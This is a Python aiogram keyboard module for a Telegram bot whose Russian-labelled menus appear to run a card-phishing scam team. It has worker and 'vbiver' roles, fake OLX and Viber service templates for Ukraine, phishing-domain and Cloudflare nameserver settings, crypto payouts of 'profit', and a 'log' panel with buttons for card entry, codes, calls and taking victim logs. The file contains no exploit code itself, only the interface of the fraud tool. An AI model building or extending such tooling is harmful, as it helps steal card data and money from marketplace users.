from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton
from translations import t


def quick_reply_menu(lang: str = "ru", is_admin: bool = False):
    rows = [
        [KeyboardButton(text=t("main_menu", lang))],
        [KeyboardButton(text=t("countries", lang)), KeyboardButton(text=t("links", lang))],
        [KeyboardButton(text=t("preferences", lang)), KeyboardButton(text=t("wallet", lang))],
        [KeyboardButton(text=t("my_domains", lang)), KeyboardButton(text=t("staff", lang))],
        [KeyboardButton(text=t("profiles", lang)), KeyboardButton(text=t("statistics", lang))],
    ]
    if is_admin:
        rows.append([KeyboardButton(text=t("admin_panel", lang))])
    return ReplyKeyboardMarkup(keyboard=rows, resize_keyboard=True)


# Тексты кнопки «Статистика» на обоих языках (для маршрутизации хендлера)
STATS_BUTTONS = {t("statistics", "ru"), t("statistics", "en")}


def main_menu(user_id: int, lang: str = "ru", is_admin: bool = False, role: str = "worker", online: bool = False, show_apply: bool = True):
    buttons = [
        [
            InlineKeyboardButton(text=t("countries", lang), callback_data="countries"),
            InlineKeyboardButton(text=t("links", lang), callback_data="links"),
        ],
        [
            InlineKeyboardButton(text=t("preferences", lang), callback_data="preferences"),
            InlineKeyboardButton(text=t("wallet", lang), callback_data="wallet"),
        ],
        [InlineKeyboardButton(text=t("my_domains", lang), callback_data="domains")],
        [
            InlineKeyboardButton(text=t("staff", lang), callback_data="staff"),
            InlineKeyboardButton(text=t("profiles", lang), callback_data="profiles"),
        ],
    ]
    if role == "vbiver":
        if online:
            buttons.append([InlineKeyboardButton(text=t("leave_vbiv", lang), callback_data="leave_vbiv")])
        else:
            buttons.append([InlineKeyboardButton(text=t("stand_vbiv", lang), callback_data="stand_vbiv")])
    if show_apply:
        buttons.append([InlineKeyboardButton(text=t("apply_team", lang), callback_data="apply_team")])
    if is_admin:
        buttons.append([InlineKeyboardButton(text=t("admin_panel", lang), callback_data="admin_panel")])
    return InlineKeyboardMarkup(inline_keyboard=buttons)


def staff_menu(lang: str = "ru", role: str = "worker", online: bool = False):
    rows = [[InlineKeyboardButton(text=t("staff_refresh", lang), callback_data="staff")]]
    if role == "vbiver":
        if online:
            rows.append([InlineKeyboardButton(text=t("leave_vbiv", lang), callback_data="leave_vbiv")])
        else:
            rows.append([InlineKeyboardButton(text=t("stand_vbiv", lang), callback_data="stand_vbiv")])
    rows.append([InlineKeyboardButton(text=t("back", lang), callback_data="main_menu")])
    return InlineKeyboardMarkup(inline_keyboard=rows)


def global_domains_menu(lang: str = "ru"):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=t("add_global_domain", lang), callback_data="add_global_domain")],
        [InlineKeyboardButton(text=t("back", lang), callback_data="admin_panel")],
    ])


def domain_choice_menu(domains: list, lang: str = "ru"):
    rows = []
    for domain in domains:
        rows.append([InlineKeyboardButton(text=domain, callback_data=f"use_domain_{domain}")])
    rows.append([InlineKeyboardButton(text=t("back", lang), callback_data="countries")])
    return InlineKeyboardMarkup(inline_keyboard=rows)


def countries_menu(lang: str = "ru"):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=t("create_own_service", lang), callback_data="create_service")],
        [InlineKeyboardButton(text=t("ukraine", lang), callback_data="country_ua")],
        [InlineKeyboardButton(text=t("back", lang), callback_data="main_menu")],
    ])


def country_services_menu(country_code: str, lang: str = "ru"):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=t("olx_1_0", lang), callback_data=f"service_{country_code}_OLX1")],
        [InlineKeyboardButton(text=t("olx_2_0", lang), callback_data=f"service_{country_code}_OLX2")],
        [InlineKeyboardButton(text=t("viber", lang), callback_data=f"service_{country_code}_Viber")],
        [InlineKeyboardButton(text=t("back", lang), callback_data="countries")],
    ])


def wallet_menu(lang: str = "ru"):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=t("my_wallets", lang), callback_data="my_wallets")],
        [InlineKeyboardButton(text=t("request_payout", lang), callback_data="request_payout")],
        [InlineKeyboardButton(text=t("payout_history", lang), callback_data="payout_history")],
        [InlineKeyboardButton(text=t("instructions", lang), callback_data="instructions")],
        [InlineKeyboardButton(text=t("back", lang), callback_data="main_menu")],
    ])


def network_menu(lang: str = "ru"):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=t("eth", lang), callback_data="wallet_network_ETH")],
        [InlineKeyboardButton(text=t("trc20", lang), callback_data="wallet_network_TRC20")],
        [InlineKeyboardButton(text=t("btc", lang), callback_data="wallet_network_BTC")],
        [InlineKeyboardButton(text=t("back", lang), callback_data="my_wallets")],
    ])


def wallets_menu(wallets: list, lang: str = "ru"):
    rows = [[InlineKeyboardButton(text=t("add_wallet", lang), callback_data="add_wallet")]]
    for w in wallets:
        rows.append([InlineKeyboardButton(
            text=f"❌ {w['network']}: {w['address'][:24]}...",
            callback_data=f"delete_wallet_{w['id']}"
        )])
    rows.append([InlineKeyboardButton(text=t("back", lang), callback_data="wallet")])
    return InlineKeyboardMarkup(inline_keyboard=rows)


def payout_wallets_menu(wallets: list, lang: str = "ru"):
    rows = []
    for w in wallets:
        rows.append([InlineKeyboardButton(
            text=f"{w['network']}: {w['address'][:20]}...",
            callback_data=f"payout_wallet_{w['id']}"
        )])
    rows.append([InlineKeyboardButton(text=t("back", lang), callback_data="wallet")])
    return InlineKeyboardMarkup(inline_keyboard=rows)


def domains_menu(domains: list, lang: str = "ru"):
    rows = [[InlineKeyboardButton(text=t("add_domain", lang), callback_data="add_domain")]]
    for d in domains:
        rows.append([InlineKeyboardButton(
            text=f"❌ {d['domain']}",
            callback_data=f"delete_domain_{d['id']}"
        )])
    rows.append([InlineKeyboardButton(text=t("back", lang), callback_data="main_menu")])
    return InlineKeyboardMarkup(inline_keyboard=rows)


def referral_menu(lang: str = "ru"):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=t("copy_referral", lang), callback_data="copy_ref")],
        [InlineKeyboardButton(text=t("back", lang), callback_data="main_menu")],
    ])


def admin_menu(lang: str = "ru"):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=t("admin_dashboard", lang), callback_data="admin_dashboard")],
        [InlineKeyboardButton(text=t("admin_users", lang), callback_data="admin_users")],
        [InlineKeyboardButton(text=t("admin_add_profit", lang), callback_data="admin_add_profit")],
        [InlineKeyboardButton(text=t("admin_ban", lang), callback_data="admin_ban")],
        [InlineKeyboardButton(text=t("admin_roles", lang), callback_data="admin_users")],
        [InlineKeyboardButton(text=t("admin_domains", lang), callback_data="admin_domains")],
        [InlineKeyboardButton(text=t("admin_broadcast", lang), callback_data="admin_broadcast")],
        [InlineKeyboardButton(text=t("admin_settings", lang), callback_data="admin_settings")],
        [InlineKeyboardButton(text=t("back", lang), callback_data="main_menu")],
    ])


def admin_settings_menu(lang: str = "ru"):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=t("setting_team_chat_link", lang), callback_data="setting_team_chat_invite_link")],
        [InlineKeyboardButton(text=t("setting_payouts_channel_link", lang), callback_data="setting_payouts_channel_invite_link")],
        [InlineKeyboardButton(text=t("setting_team_chat_id", lang), callback_data="setting_team_chat_id")],
        [InlineKeyboardButton(text=t("setting_payouts_channel_id", lang), callback_data="setting_payouts_channel_id")],
        [
            InlineKeyboardButton(text=t("setting_ns1", lang), callback_data="setting_ns1"),
            InlineKeyboardButton(text=t("setting_ns2", lang), callback_data="setting_ns2"),
        ],
        [
            InlineKeyboardButton(text=t("setting_cf_ns1", lang), callback_data="setting_cf_ns1"),
            InlineKeyboardButton(text=t("setting_cf_ns2", lang), callback_data="setting_cf_ns2"),
        ],
        [InlineKeyboardButton(text=t("setting_default_percent", lang), callback_data="setting_default_percent")],
        [InlineKeyboardButton(text=t("setting_instructions", lang), callback_data="setting_instructions")],
        [InlineKeyboardButton(text=t("admin_pending_apps", lang), callback_data="admin_pending_apps")],
        [InlineKeyboardButton(text=t("admin_online_vbivers", lang), callback_data="admin_online_vbivers")],
        [InlineKeyboardButton(text=t("admin_payouts", lang), callback_data="admin_payouts")],
        [InlineKeyboardButton(text=t("admin_reset_stats", lang), callback_data="admin_reset_stats")],
        [InlineKeyboardButton(text=t("admin_view_logs", lang), callback_data="admin_view_logs")],
        [InlineKeyboardButton(text=t("admin_restart_bot", lang), callback_data="admin_restart_bot")],
        [InlineKeyboardButton(text=t("back", lang), callback_data="admin_panel")],
    ])


def admin_bans_menu(users: list, lang: str = "ru"):
    rows = []
    for user in users[:20]:
        name = f"@{user['username']}" if user.get("username") else str(user["user_id"])
        label = f"{name} {user['hashtag']}"
        if user.get("banned"):
            rows.append([InlineKeyboardButton(text=f"✅ {label}", callback_data=f"bans_unban_{user['user_id']}")])
        else:
            rows.append([InlineKeyboardButton(text=f"🚫 {label}", callback_data=f"bans_ban_{user['user_id']}")])
    rows.append([InlineKeyboardButton(text=t("back", lang), callback_data="admin_panel")])
    return InlineKeyboardMarkup(inline_keyboard=rows)


def back_button(lang: str = "ru", callback: str = "main_menu"):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=t("back", lang), callback_data=callback)]
    ])


def language_menu(lang: str = "ru"):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=t("russian", lang), callback_data="lang_ru")],
        [InlineKeyboardButton(text=t("english", lang), callback_data="lang_en")],
        [InlineKeyboardButton(text=t("back", lang), callback_data="main_menu")],
    ])


# ─────────── ЛОГ-МЕНЮ ВБИВЕРА ───────────
# Тексты кнопок фиксированы (как в оригинальном боте) — по ним идёт маршрутизация.
BTN_LOG_RELEASE = "🔥 Отпустить лог"
BTN_LOG_CODE = "👌 Код"
BTN_LOG_PROFIT = "💰 Профит"
BTN_LOG_ONLINE = "👁 Онлайн"
BTN_LOG_INFO = "😈 Инфор..."
BTN_LOG_QUESTION = "❓ Вопрос"
BTN_LOG_BAN = "❌ Бан"
BTN_LOG_CALL = "📞 Звонок"
BTN_LOG_CARD = "💳 Ввод ка..."
BTN_LOG_CHOOSE = "🚀 Выбор..."
BTN_LOG_HOME = "👑 Главное меню"

LOG_BUTTONS = {
    BTN_LOG_RELEASE, BTN_LOG_CODE, BTN_LOG_PROFIT, BTN_LOG_ONLINE,
    BTN_LOG_INFO, BTN_LOG_QUESTION, BTN_LOG_BAN, BTN_LOG_CALL,
    BTN_LOG_CARD, BTN_LOG_CHOOSE, BTN_LOG_HOME,
}


def log_control_menu():
    """Reply-клавиатура под карточкой лога (как на скрине)."""
    return ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text=BTN_LOG_RELEASE)],
            [
                KeyboardButton(text=BTN_LOG_CODE),
                KeyboardButton(text=BTN_LOG_PROFIT),
                KeyboardButton(text=BTN_LOG_ONLINE),
            ],
            [
                KeyboardButton(text=BTN_LOG_INFO),
                KeyboardButton(text=BTN_LOG_QUESTION),
                KeyboardButton(text=BTN_LOG_BAN),
            ],
            [
                KeyboardButton(text=BTN_LOG_CALL),
                KeyboardButton(text=BTN_LOG_CARD),
                KeyboardButton(text=BTN_LOG_CHOOSE),
            ],
            [KeyboardButton(text=BTN_LOG_HOME)],
        ],
        resize_keyboard=True,
    )


def take_log_button(log_id: int):
    """Инлайн-кнопка «взять лог» для рассылки вбиверам."""
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🎯 Взять лог", callback_data=f"take_log_{log_id}")]
    ])


def log_choose_menu(log_id: int):
    """Подменю «🚀 Выбор...»."""
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ Отметить успех", callback_data=f"log_success_{log_id}")],
        [InlineKeyboardButton(text="♻️ Вернуть в пул", callback_data=f"log_return_{log_id}")],
        [InlineKeyboardButton(text="❗ Проблема / отказ", callback_data=f"log_problem_{log_id}")],
        [InlineKeyboardButton(text="🔙 Назад", callback_data="log_choose_back")],
    ])


def newlog_cancel_menu():
    return ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton(text="❌ Отмена")]],
        resize_keyboard=True,
    )


def stats_period_menu():
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="📅 День", callback_data="stats_period_day"),
            InlineKeyboardButton(text="🗓 Неделя", callback_data="stats_period_week"),
        ],
        [
            InlineKeyboardButton(text="📆 Месяц", callback_data="stats_period_month"),
            InlineKeyboardButton(text="♾ Всё время", callback_data="stats_period_all"),
        ],
    ])
